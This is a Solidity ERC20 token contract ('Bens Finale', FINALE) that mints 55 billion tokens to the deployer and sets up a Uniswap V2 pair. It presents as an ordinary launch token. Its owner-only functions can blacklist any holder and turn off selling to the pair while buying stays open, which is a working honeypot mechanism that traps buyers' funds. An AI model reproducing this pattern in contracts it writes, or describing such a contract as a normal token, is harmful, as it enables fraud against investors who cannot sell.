// SPDX-License-Identifier: Unlicense
pragma solidity >=0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "lib/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "lib/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";

contract Finale is ERC20, Ownable {
    address public pair;
    uint256 public maxHoldingAmount;
    bool public tradingOn = false;
    bool public sellingOn = false;
    bool public limitOn = true;
    mapping(address => bool) public blacklist;

    constructor() ERC20("Bens Finale", "FINALE") {
        // 55 billion tokens
        uint256 _totalSupply = 55 * 10 ** 9 * 10 ** 18;
        _mint(msg.sender, _totalSupply);
        maxHoldingAmount = _totalSupply / 100;
        address ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        pair = IUniswapV2Factory(IUniswapV2Router02(ROUTER).factory()).createPair(WETH, address(this));
    }

    function setBlacklist(address _address, bool _isBlacklisted) external onlyOwner {
        blacklist[_address] = _isBlacklisted;
    }

    function setRule(bool _tradingOn, bool _sellingOn, bool _limitOn, uint256 _maxHoldingAmount) external onlyOwner {
        tradingOn = _tradingOn;
        sellingOn = _sellingOn;
        limitOn = _limitOn;
        maxHoldingAmount = _maxHoldingAmount;
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual override {
        require(!blacklist[to] && !blacklist[from], "Blacklisted");
        if (!tradingOn) {
            require(from == owner() || to == owner(), "Trading not enabled");
        } else {
            require(sellingOn || to != pair, "Selling not enabled");
            if (limitOn && from == pair) {
                require(super.balanceOf(to) + amount <= maxHoldingAmount, "Max holding amount exceeded");
            }
        }
    }
}